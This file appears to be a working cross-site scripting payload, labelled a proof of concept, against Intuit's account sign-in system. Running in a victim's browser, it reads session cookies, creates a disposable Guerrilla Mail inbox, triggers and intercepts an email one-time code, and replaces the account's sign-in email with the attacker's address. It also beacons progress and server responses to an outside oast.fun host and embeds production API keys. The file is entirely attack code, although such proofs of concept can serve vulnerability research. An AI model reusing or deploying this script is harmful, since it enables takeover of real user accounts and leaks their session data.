(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var G='https://api.guerrillamail.com/ajax.php';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}
function wp(url){
return fetch(W+encodeURIComponent(url)).then(function(r){
if(!r.ok)throw new Error('proxy '+r.status);
return r.text()
})
}
function uuid(){return'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)})}

var origSession=gc('ius_session');
var visitorId=gc('ivid');

var baseHdrs={
'Content-Type':'application/json',
'Intuit_Interception':'ignore-response',
'intuit_visitorid':visitorId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_offeringenv':'prd',
'intuit_identity_routing':'SBSEG',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_locale':'en-us',
'intuit_country':'US',
'intuit_samesite_support':'true',
'intuit_authn_session_slot':'qbn',
'intuit_origin':'https://accounts.intuit.com'
};

log('[*] XSS Sign-In Email Change PoC (p37)');
log('[*] Origin: '+location.origin);
log('[*] Key fix: SignIn with account_manager scope');
log('');

log('[0] Getting temp email...');
wp(G+'?f=get_email_address')
.then(function(raw){
var data=JSON.parse(raw);
var email=data.email_addr;
var sid=data.sid_token;
log('[0] Temp email: '+email);
beacon('p37-email',email);

var initHdrs={};
for(var k in baseHdrs)initHdrs[k]=baseHdrs[k];
initHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0';
initHdrs['intuit_sessionid']=origSession;
initHdrs['intuit_profilingid']=origSession;
initHdrs['intuit_flowid']=uuid();
initHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}));

log('[1] Initialize verifier...');
return fetch('/factors/v1/verifier/initialize/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email})
}).then(function(r){return r.json()}).then(function(d){
if(!d.verifierSessionId)throw new Error('no vsid');
var vsid=d.verifierSessionId;
log('[1] vsid: '+vsid.substring(0,30)+'...');

log('[2] Polling for OTP...');
var attempt=0;
function poll(){
attempt++;
return wp(G+'?f=check_email&seq=0&sid_token='+encodeURIComponent(sid))
.then(function(raw2){
var resp=JSON.parse(raw2);
var list=resp.list||[];
if(attempt%5===1) log('[2] Poll #'+attempt+': '+list.length+' emails');
if(list.length>0){
var found=null;
for(var i=0;i<list.length;i++){
var subj=(list[i].mail_subject||'').toLowerCase();
if(subj.indexOf('welcome to guerrilla')!==-1)continue;
found=list[i];break
}
if(found){
log('[2] Got: '+found.mail_subject);
return wp(G+'?f=fetch_email&email_id='+found.mail_id+'&sid_token='+encodeURIComponent(sid))
.then(function(r2){return JSON.parse(r2)})
}
}
if(attempt>=60)throw new Error('OTP timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.mail_body||'').replace(/<[^>]*>/g,' ');
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp)throw new Error('no OTP');
log('[2] OTP: '+otp);

log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',headers:initHdrs,credentials:'include',
body:JSON.stringify({verifierSessionId:vsid,otp:otp})
}).then(function(r){return r.json()}).then(function(vd){
if(!vd.verifierToken)throw new Error('no verifierToken');
var vt=vd.verifierToken;
log('[3] Got verifierToken');

log('[4] SignIn with ACCOUNT_MANAGER scope...');
var signInHdrs={};
for(var k in baseHdrs)signInHdrs[k]=baseHdrs[k];
signInHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0';
signInHdrs['intuit_sessionid']=origSession;
signInHdrs['intuit_profilingid']=origSession;
signInHdrs['intuit_flowid']=uuid();
signInHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'account_manager'}));

return fetch('/identity-api/signin/graphql',{
method:'POST',headers:signInHdrs,credentials:'include',
body:JSON.stringify({
query:'mutation SignInWithVerifierToken($input:Identity_BrowserSignInWithVerifierTokenInput!){identityBrowserSignInWithVerifierToken(input:$input){__typename ...on Identity_BrowserSignInWithVerifierTokenNothingElseRequired{__typename successCode authenticationSession{digitalIdentity{legacyAuthId pseudonymId}}}...on Identity_BrowserSignInWithVerifierTokenAccessDenied{__typename}...on Identity_BrowserSignInWithVerifierTokenSomethingElseRequired{__typename}...on Identity_SignInError{__typename}}}',
variables:{input:{
intent:{appGroup:'',assetAlias:'Intuit.identity.experiences.oneintuitam',securityCategory:'ORANGE',redirectUri:'https://accounts.intuit.com/app/account-manager/security/email',rememberMe:false},
clientCapabilitySet:'v13',finalSlotNames:['qbn'],
deviceCapabilities:{passkeySupported:false,simTs43Supported:false,digitalCredential:{userAgentAllowsProtocols:[]}},
inputSlotName:'qbn',tenantIds:['50000003'],verifierToken:vt
}}
})
}).then(function(r){return r.text()}).then(function(sr){
log('[4] SignIn raw: '+sr.substring(0,300));
beacon('p37-signin',sr.substring(0,900));

var srd;try{srd=JSON.parse(sr)}catch(e){}
var authId='';
if(srd&&srd.data){
var res=srd.data.identityBrowserSignInWithVerifierToken;
if(res&&res.authenticationSession&&res.authenticationSession.digitalIdentity){
authId=res.authenticationSession.digitalIdentity.legacyAuthId||'';
}
}
if(!authId)throw new Error('no authId: '+sr.substring(0,200));
log('[4] authId: '+authId);

var freshSession=gc('ius_session');
log('[4] Fresh session: '+freshSession.substring(0,20)+'...');
log('[4] Session changed: '+(freshSession!==origSession));

var flowId=uuid();

var finalHdrs={};
for(var k in baseHdrs)finalHdrs[k]=baseHdrs[k];
finalHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0';
finalHdrs['intuit_routingid']=authId;
finalHdrs['intuit_sessionid']=freshSession;
finalHdrs['intuit_profilingid']=freshSession;
finalHdrs['intuit_flowid']=flowId;
finalHdrs['intuit_tid']=uuid();
finalHdrs['intuit_baggage']=btoa(JSON.stringify({scope_area:'account_manager'}));

log('[5] Replacing sign-in email...');
return fetch('/identity-api/v2/graphql',{
method:'POST',headers:finalHdrs,credentials:'include',
cache:'no-store',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr){
log('[5] Response: '+cr.substring(0,500));
beacon('p37-replace-a',cr.substring(0,900));

var crd;try{crd=JSON.parse(cr)}catch(e){}
if(crd&&crd.data&&crd.data.identityCreateOrReplaceEmailCredential){
var result=crd.data.identityCreateOrReplaceEmailCredential;
if(result.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('========================================');
log('  SIGN-IN EMAIL REPLACED TO:');
log('  '+email);
log('  Status: '+result.status);
log('========================================');
beacon('p37-SUCCESS','email='+email+'&status='+result.status);
}else{
log('[!] Failed: '+result.__typename+' - '+(result.message||''));
beacon('p37-fail',result.__typename);

if(result.__typename==='Identity_CredentialUnauthorizedError'){
log('[5b] Retrying with first API key...');
var retryHdrs={};
for(var k in finalHdrs)retryHdrs[k]=finalHdrs[k];
retryHdrs['authorization']='Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0';
retryHdrs['intuit_tid']=uuid();

return fetch('/identity-api/v2/graphql',{
method:'POST',headers:retryHdrs,credentials:'include',
cache:'no-store',
body:JSON.stringify({
operationName:'ReplaceEmail',
query:'mutation ReplaceEmail($input:Identity_CreateOrReplaceEmailCredentialInput!){identityCreateOrReplaceEmailCredential(input:$input){__typename ...on Identity_CreateOrReplaceEmailCredentialSuccess{status}...on Identity_CredentialUnauthorizedError{message}...on Identity_CredentialInvalidInputError{message}...on Identity_DigitalIdentityLockedOutError{message}}}',
variables:{input:{newEmailAddress:email}}
})
}).then(function(r){return r.text()}).then(function(cr2){
log('[5b] Response: '+cr2.substring(0,500));
beacon('p37-retry',cr2.substring(0,900));

var crd2;try{crd2=JSON.parse(cr2)}catch(e){}
if(crd2&&crd2.data&&crd2.data.identityCreateOrReplaceEmailCredential){
var r2=crd2.data.identityCreateOrReplaceEmailCredential;
if(r2.__typename==='Identity_CreateOrReplaceEmailCredentialSuccess'){
log('');
log('========================================');
log('  SIGN-IN EMAIL REPLACED TO:');
log('  '+email);
log('  Status: '+r2.status);
log('========================================');
beacon('p37-SUCCESS','email='+email+'&key=first');
}else{
log('[!] Retry also failed: '+r2.__typename+' - '+(r2.message||''));
beacon('p37-retry-fail',r2.__typename);
}
}
})
}
}
}else if(crd&&crd.errors){
log('[!] Errors: '+JSON.stringify(crd.errors).substring(0,400));
beacon('p37-err',JSON.stringify(crd.errors).substring(0,900));
}
})
})
})
})
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p37-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p37-crash?e='+encodeURIComponent(e.message);
}
})();
